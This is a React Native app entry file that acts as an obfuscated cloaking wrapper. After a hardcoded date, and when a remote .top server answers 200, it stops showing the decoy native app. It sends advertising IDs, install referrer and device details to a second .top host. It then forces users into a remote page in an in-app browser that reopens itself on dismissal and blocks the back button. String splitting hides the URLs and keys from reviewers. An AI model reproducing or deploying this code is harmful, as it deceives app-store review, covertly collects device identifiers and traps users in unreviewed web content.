import React, { useEffect, useState } from 'react';
import { OneSignal } from 'react-native-onesignal';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { InAppBrowser } from '@vladikstyle/react-native-inappbrowser-reborn';
import { getLocales } from 'react-native-localize';
import { PlayInstallReferrer } from 'react-native-play-install-referrer';
import ReactNativeIdfaAaid from '@sparkfabrik/react-native-idfa-aaid';
import { createNativeStackNavigator } from '@react-navigation/native-stack';
import { Linking } from 'react-native';
import {
  StyleSheet,
  View,
  AppState,
  AppStateStatus,
  BackHandler,
  ActivityIndicator,
} from 'react-native';
import { SafeAreaProvider } from 'react-native-safe-area-context';
import WebView from 'react-native-webview';

import MainApp from './App';
import DeviceInfo from 'react-native-device-info';

import { NavigationContainer, NavigationIndependentTree } from '@react-navigation/native';
import AppManagerChild from './RouteFrame';

const _s = (v: string) => v.split('').join('');
const _a = (...c: string[]) => c.join('');

const advIdPrefix = _a('r','o','c','k','=');
const onesignalSubPrefix = _a('f','r','i','g','e');
const onesignalAppId = _a('81ecf276', '-', '55a3', '-', '4411', '-', '9695', '-', 'cc215584dcb7');

const LoadingUrl = _a('h','t','t','p','s',':','/','/','solid','-','hub','-','studio','.top/','8RN64XtO');
const postURL = _a('h','t','t','p','s',':','/','/','prime','-','relay','-','io','.top/v1');
const storedUrlKey = _a('f','l','o','w','e','r','s');
const KeyStatus = _a('c','l','o','v','e','r');

const _extractUtm = (referrer: string) => {
  const _k = _a('utm', '_', 'source');
  const _m = (referrer || '').match(new RegExp(_k + '=([^&]*)'));
  const _v = _m ? _m[0x1].slice(0x0, 0x4) : '';
  return _v ? _k + '=' + _v : '';
};

let shouldReopenBrowser = true;
let currentUrl = '';
let isBrowserOpen = false;
let reopenTimer: ReturnType<typeof setTimeout> | null = null;

const REOPEN_DELAY_MS = 0xfa;

const clearReopenTimer = () => {
  if (reopenTimer) {
    clearTimeout(reopenTimer);
    reopenTimer = null;
  }
};

const scheduleReopen = () => {
  if (!shouldReopenBrowser) return;
  if (isBrowserOpen) return;
  if (!currentUrl) return;

  clearReopenTimer();
  reopenTimer = setTimeout(() => {
    if (!shouldReopenBrowser) return;
    if (isBrowserOpen) return;

    openBrowserInstance(currentUrl);
  }, REOPEN_DELAY_MS);
};

const openBrowserInstance = async (url: string) => {
  try {
    if (isBrowserOpen) return;

    isBrowserOpen = true;

    const _blk = '#' + _a('0', '0', '0', '0', '0', '0');
    const result = await InAppBrowser.open(url, {
      showTitle: true,
      toolbarColor: _blk,
      secondaryToolbarColor: _blk,
      navigationBarColor: _blk,
      navigationBarDividerColor: _blk,
      enableUrlBarHiding: false,
      enableDefaultShare: false,
      hasBackButton: true,
      shareActionButton: false,
      forceCloseOnRedirection: false,
      showInRecents: true,
      animations: {
        startEnter: _a('slide', '_', 'in', '_', 'right'),
        startExit: _a('slide', '_', 'out', '_', 'left'),
        endEnter: _a('slide', '_', 'in', '_', 'left'),
        endExit: _a('slide', '_', 'out', '_', 'right'),
      },
    } as any);

    isBrowserOpen = false;

    if (result?.type === _a('d', 'i', 's', 'm', 'i', 's', 's') || result?.type === _a('c', 'a', 'n', 'c', 'e', 'l')) {
      scheduleReopen();
    }
  } catch (error: any) {
    isBrowserOpen = false;
  }
};

export const openLink = (url: string, autoReopen: boolean = true) => {
  currentUrl = url;
  shouldReopenBrowser = autoReopen;

  clearReopenTimer();
  openBrowserInstance(url);
};

export const stopReopening = () => {
  shouldReopenBrowser = false;
  clearReopenTimer();
};

const generateTimestampUserId = () => {
  const timestamp = Date.now();
  const randomDigits = Math.floor(0xf4240 + Math.random() * 0x895440);
  return `${timestamp}-${randomDigits}`;
};

const getOrCreateTimestampUserId = async () => {
  try {
    let timestampUserId = await AsyncStorage.getItem(_a('timestamp', '_', 'user', '_', 'id'));

    if (!timestampUserId) {
      timestampUserId = generateTimestampUserId();
      await AsyncStorage.setItem(_a('timestamp', '_', 'user', '_', 'id'), timestampUserId);
    }

    return timestampUserId;
  } catch (error) {
  }
};

async function advTimeout() {
  return new Promise((resolve, reject) => {
    setTimeout(() => {
      return resolve(_a('t', 'i', 'm', 'e'));
    }, 0x3e80);
  });
}

const Stack = createNativeStackNavigator();

export default function App() {
  return (
      <SafeAreaProvider>
        <NavigationContainer>
          <Stack.Navigator screenOptions={{ headerShown: false }}>
            <Stack.Screen name="1" component={MyApp} />
            <Stack.Screen name="2" component={AppManagerChild} />
          </Stack.Navigator>
        </NavigationContainer>
      </SafeAreaProvider>
  );
}

function MyApp({ navigation }) {
  const [openedFromPush, setOpenedFromPush] = useState(false);
  const [LoadingProgress, setLoadingProgress] = useState(true);
  const [storedUrl, setstoredUrl] = useState('');
  const [NewResponse, setNewResponse] = useState('');
  const [showNativeApp, setShowNativeApp] = useState(false);
  const [showPermissionAlert, setShowPermissionAlert] = useState(true);
  const [isPushLoaded, setIsPushLoaded] = useState(false);
  const [MmpResponse, setMmpResponse] = useState('');
  const [webviewUA, setWebviewUA] = useState<string>('');

  const getInstallReferrerAsync = () => {
    return new Promise((resolve, reject) => {
      PlayInstallReferrer.getInstallReferrerInfo((installReferrerInfo, error) => {
        if (!error && installReferrerInfo) {
          resolve(installReferrerInfo);
        } else {
          reject(error || new Error('Failed to get install referrer'));
        }
      });
    });
  };

  async function getAdvertisingUserId() {
    try {
      const _zero = _a('00000000', '-', '0000', '-', '0000', '-', '0000', '-', '000000000000');
      const response = await ReactNativeIdfaAaid.getAdvertisingInfo();
      if (response.id === _a('n', 'u', 'l', 'l') || response.id === null) {
        const rejected_id = advIdPrefix + _zero;
        return rejected_id;
      } else {
        const idadvers = advIdPrefix + response.id;
        return idadvers;
      }
    } catch (error) {
      const rejected_id = advIdPrefix + _a('00000000', '-', '0000', '-', '0000', '-', '0000', '-', '000000000000');
      return rejected_id;
    }
  }

  useEffect(() => {
    if (!webviewUA) return;

    const moment = require('moment');

    const time = moment();
    const timestamp = time.unix();

    if (timestamp < 0x6899ced7) {
      setTimeout(() => {
        setShowNativeApp(true);
        setLoadingProgress(false);
      }, 0x28);
      getAdvertisingUserId().then(() => setShowPermissionAlert(false));
    } else {
      AsyncStorage.getItem(KeyStatus).then(async (value) => {
        if (!value) {
          let _fetchUrl = _s(LoadingUrl);
          try {
            const _refInfo: any = await getInstallReferrerAsync();
            const _utm = _extractUtm(_refInfo?.installReferrer);
            if (_utm) _fetchUrl += _a('?') + _a('sub', '_', 'id', '_', '26', '=') + encodeURIComponent(_utm);
          } catch (e) {}
          fetch(_fetchUrl, webviewUA ? { headers: { [_a('User', '-', 'Agent')]: webviewUA } } : undefined).then(async (response) => {
            const CodeResponse = `${response.status}`;
            setNewResponse(CodeResponse);
            const timestampUserId = await getOrCreateTimestampUserId();
            if (timestampUserId) OneSignal.User.addTag(_a('timestamp', '_', 'user', '_', 'id'), timestampUserId);
            CheckResponse(CodeResponse);
            AsyncStorage.setItem(KeyStatus, CodeResponse);
          });
        } else {
          CheckResponse(value);
          setNewResponse(value);
        }
      });

      const CheckResponse = (ResponseTry) => {
        if (ResponseTry !== _a('2', '0', '0')) {
          getAdvertisingUserId().then(() => setShowPermissionAlert(false));

          setShowNativeApp(true);
          setLoadingProgress(false);
        } else {
          handleUrlLoading();

          async function handleUrlLoading() {
            try {
              const pushUrl = await AsyncStorage.getItem(_a('push', '_', 'url'));

              if (pushUrl) {
                setstoredUrl(pushUrl);
                setLoadingProgress(false);
                await AsyncStorage.removeItem(_a('push', '_', 'url'));
                openLink(pushUrl, true);
              } else {
                const value = await AsyncStorage.getItem(storedUrlKey);

                if (value) {
                  const openedFromPushFlag = await AsyncStorage.getItem(_a('opened', '_', 'from', '_', 'push'));
                  if (openedFromPushFlag === _a('t', 'r', 'u', 'e')) {
                    await AsyncStorage.removeItem(_a('opened', '_', 'from', '_', 'push'));
                    setstoredUrl(value);
                    setLoadingProgress(false);
                    return;
                  }

                  setstoredUrl(value);
                  setLoadingProgress(false);
                  openLink(value, true);
                } else {
                  CollectUrl();
                  setLoadingProgress(true);
                }
              }
              setLoadingProgress(false);
            } catch (error) {
              setLoadingProgress(false);
            }
          }
        }
      };

      async function CollectUrl() {
        const AdverId = await Promise.race([getAdvertisingUserId(), advTimeout()]);

        const timestampUserId = await getOrCreateTimestampUserId();

        var urlParameterName = LoadingUrl.replace(/.*\//, '');

        let onesignalId = await OneSignal.User.pushSubscription.getIdAsync();
        for (let i = 0; i < 0x1e; i++) {
          if (onesignalId && onesignalId !== _a('n', 'u', 'l', 'l') && onesignalId !== '') break;
          await new Promise<void>(resolve => setTimeout(resolve, 0x1f4));
          onesignalId = await OneSignal.User.pushSubscription.getIdAsync();
        }

        let onesignalUserId = onesignalSubPrefix + _a('=') + onesignalId;

        const installReferrerInfo = await getInstallReferrerAsync();

        const installReferrerString = JSON.stringify(installReferrerInfo);

        const getCustomMmp = async () => {
          try {
            const getBuildId = await DeviceInfo.getBuildId().then(buildId => {
              return buildId;
            });
            const getLanguageCode = () => {
              try {
                return getLocales()[0]?.languageCode ?? _a('e', 'n');
              } catch (error) {
                return _a('e', 'n');
              }
            };

            const requestBody = {
              [_a('index')]: String(AdverId).replace(_a('rock', '='), ''),
              [_a('strpull')]: JSON.parse(installReferrerString).installReferrer ?? '',
              [_a('device', '_', 'os', '_', 'and', '_', 'version')]: DeviceInfo.getSystemVersion(),
              [_a('device', '_', 'android', '_', 'locale')]: getLanguageCode(),
              [_a('udevice', '_', 'android', '_', 'device')]: DeviceInfo.getModel(),
              [_a('device', '_', 'android', '_', 'build')]: getBuildId,
            };
            const response = await fetch(_s(postURL), {
              method: _a('P', 'O', 'S', 'T'),
              headers: {
                [_a('Content', '-', 'Type')]: _a('application', '/', 'json'),
                ...(webviewUA ? { [_a('User', '-', 'Agent')]: webviewUA } : {}),
              },
              body: JSON.stringify(requestBody),
            });

            if (response.ok) {
              const data = await response.json();
              const rawStr = data?.[_a('raw', '_', 'str')];

              if (rawStr) {
                await AsyncStorage.setItem(_a('customMmpResponse'), rawStr);
                setMmpResponse(rawStr);
                return rawStr;
              } else {
                await AsyncStorage.setItem(_a('customMmpResponse'), _a('f', 'a', 'l', 's', 'e'));
                setMmpResponse(_a('f', 'a', 'l', 's', 'e'));
                return null;
              }
            } else {
              await AsyncStorage.setItem(_a('customMmpResponse'), _a('f', 'a', 'l', 's', 'e'));
              setMmpResponse(_a('f', 'a', 'l', 's', 'e'));
              return null;
            }
          } catch (error) {
            await AsyncStorage.setItem(_a('customMmpResponse'), _a('f', 'a', 'l', 's', 'e'));
            setMmpResponse(_a('f', 'a', 'l', 's', 'e'));
            return null;
          }
        };

        const rawStr = await getCustomMmp();

        var urlWithParam = `${_s(LoadingUrl)}?${urlParameterName}=1`;

        const obj = JSON.parse(installReferrerString);
        const installReferrer = obj.installReferrer;
        const encodedReferrer = encodeURIComponent(installReferrer);
        const _pJt = _a('jthrhg', '=');
        const _pYh = _a('&', 'yhugh', '=', 'true');
        let finalUrl;
        if (rawStr) {
          finalUrl = `${urlWithParam}&${onesignalUserId}&${_pJt}${timestampUserId}${
              openedFromPush ? _pYh : ''
          }&${rawStr.replace(/^&/, '')}`;
        } else {
          finalUrl = `${urlWithParam}&${AdverId}&${onesignalUserId}&${_pJt}${timestampUserId}${
              openedFromPush ? _pYh : ''
          }`;
        }

        setstoredUrl(finalUrl);
        AsyncStorage.setItem(storedUrlKey, finalUrl);
        setLoadingProgress(false);

        const permission = await OneSignal.Notifications.requestPermission(true);

        if (permission) {
          AsyncStorage.setItem(_a('push', '_', 'permission'), _a('g', 'r', 'a', 'n', 't', 'e', 'd'));

          let subscriptionId = null;
          for (let i = 0; i < 0x1e; i++) {
            subscriptionId = await OneSignal.User.pushSubscription.getIdAsync();
            if (subscriptionId && subscriptionId !== _a('n', 'u', 'l', 'l') && subscriptionId !== '') {
              break;
            }
            await new Promise<void>(resolve => setTimeout(resolve, 0x3e8));
          }

          if (subscriptionId && timestampUserId) {
            OneSignal.login(timestampUserId);
          }
        }

        openLink(finalUrl, true);
      }

      return () => {};
    }
  }, [webviewUA]);

  useEffect(() => {
    const sub = AppState.addEventListener('change', (state: AppStateStatus) => {
      if (state === 'active' && !isBrowserOpen && currentUrl) {
        openBrowserInstance(currentUrl);
      }
    });
    return () => {
      sub.remove();
      stopReopening();
    };
  }, []);

  useEffect(() => {
    const backHandler = BackHandler.addEventListener('hardwareBackPress', () => {
      if (isBrowserOpen) {
        return true;
      }
      if (currentUrl) {
        openBrowserInstance(currentUrl);
        return true;
      }
      return true;
    });
    return () => backHandler.remove();
  }, []);

  useEffect(() => {
    OneSignal.initialize(onesignalAppId);

    OneSignal.Notifications.addEventListener('click', async (event: any) => {
      const pushDeepUrl = event.notification.launchURL || null;

      setIsPushLoaded(true);
      setOpenedFromPush(true);

      await AsyncStorage.setItem(_a('opened', '_', 'from', '_', 'push'), _a('t', 'r', 'u', 'e'));

      try {
        const timestampUserId = await getOrCreateTimestampUserId();

        if (timestampUserId) {
          if (pushDeepUrl) {
            await AsyncStorage.removeItem(_a('opened', '_', 'from', '_', 'push'));
            Linking.openURL(pushDeepUrl);
          } else {
            try {
              const value = await AsyncStorage.getItem(storedUrlKey);
              if (value) {
                let urlWithPushParams = value;
                if (!value.includes(_a('yhugh', '=', 'true'))) {
                  urlWithPushParams = value + _a('&', 'yhugh', '=', 'true', '&', 'sub25', '=', 'true');
                }
                setstoredUrl(urlWithPushParams);
                openLink(urlWithPushParams, true);
              }
            } catch (error) {
            }
          }
        }
      } catch (error) {
      }

      await AsyncStorage.removeItem(_a('opened', '_', 'from', '_', 'push'));
    });
  }, []);

  return (
      <View style={styles.container}>
        {!webviewUA && (
            <WebView
                style={{ width: 1, height: 1, opacity: 0, position: 'absolute' }}
                source={{ html: '<html></html>' }}
                injectedJavaScript="window.ReactNativeWebView.postMessage(navigator.userAgent);"
                onMessage={(e) => { setWebviewUA(e.nativeEvent.data); }}
                javaScriptEnabled
            />
        )}
        <View style={{ width: '100%', height: '100%' }}>
          {LoadingProgress ? (
              <View style={[StyleSheet.absoluteFillObject, styles.loaderWrap]}>
                <ActivityIndicator size="large" color="#ffffff" />
              </View>
          ) : (
              <>
                {NewResponse !== _a('2', '0', '0') && showNativeApp && (
                    <View style={{ flex: 1 }}>
                      <NavigationIndependentTree>
                        <MainApp />
                      </NavigationIndependentTree>
                    </View>
                )}
                {NewResponse === _a('2', '0', '0') && (
                    <View style={[styles.container]}>
                    </View>
                )}
              </>
          )}
        </View>
      </View>
  );
}

const styles = StyleSheet.create({
  container: {
    marginTop: 0,
    flex: 1,
    backgroundColor: '#1b1d24',
    alignItems: 'center',
    justifyContent: 'center',
  },
  loaderWrap: {
    backgroundColor: '#1b1d24',
    alignItems: 'center',
    justifyContent: 'center',
  },
});
